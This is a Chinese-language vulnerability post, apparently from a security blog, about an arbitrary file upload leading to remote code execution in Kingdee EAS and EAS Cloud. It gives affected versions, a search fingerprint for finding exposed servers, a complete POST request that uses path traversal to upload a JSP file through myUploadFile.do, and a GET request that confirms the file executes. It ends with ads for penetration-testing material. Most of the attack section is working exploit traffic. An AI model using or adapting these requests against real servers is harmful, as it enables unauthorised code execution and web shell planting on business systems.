# 原创
：  金蝶EAS代码执行漏洞

# 金蝶EAS代码执行漏洞

### 【漏洞概述】

金蝶 EAS 及 EAS Cloud 是金蝶软件公司推出的一套企业级应用软件套件，旨在帮助企业实现全面的管理和业务流程优化。

### 【漏洞介绍】

金蝶 EAS 及 EAS Cloud 存在远程代码执行漏洞

### 【影响版本】

金蝶 EAS 8.0，8.1，8.2，8.5<br/> 金蝶 EAS Cloud 8.6私有云，8.6公有云，8.6.1，8.8

### 【指纹】

app=”Kingdee-EAS”

### 【产品界面】

【利用过程】<br/> Kingdee EAS EAS Cloud myUploadFile.do接口存在任意文件上传问题

```
POST /easportal/xxx/%2e%2e/xxx/myUploadFile.do HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySq4lDnabv8CwHfvx
Cookie: sl-session=sqPhC9MLJmWsiN7c9/P6tA==
Accept-Encoding: gzip, deflate
Content-Length: 210
SL-CE-SUID: 47

------WebKitFormBoundarySq4lDnabv8CwHfvx
Content-Disposition: form-data; name="myFile"; filename="/demo.jsp"
Content-Type: text/html

&lt;%out.println("test123");%&gt;
------WebKitFormBoundarySq4lDnabv8CwHfvx--

```

### 【验证】

```
GET /easportal/xxx/../demo.jsp HTTP/1.1
Host: 127.0.0.1

```

### 【修复建议】

及时更新软件版本

**没看够~？欢迎关注！**

** **<img alt="" height="567" src="https://img-blog.csdnimg.cn/3f5a63e56f7b420e82616d0099771f32.jpeg" width="1015"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/f333a24647774be5b99b00fb7019d620.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/3e579b7d7a164889a57771c035775069.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/a601ca2e0eb040bd911477a4f54fef8e.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/04beeeb6757b422a83ca0900a349a544.png" width="665"/>
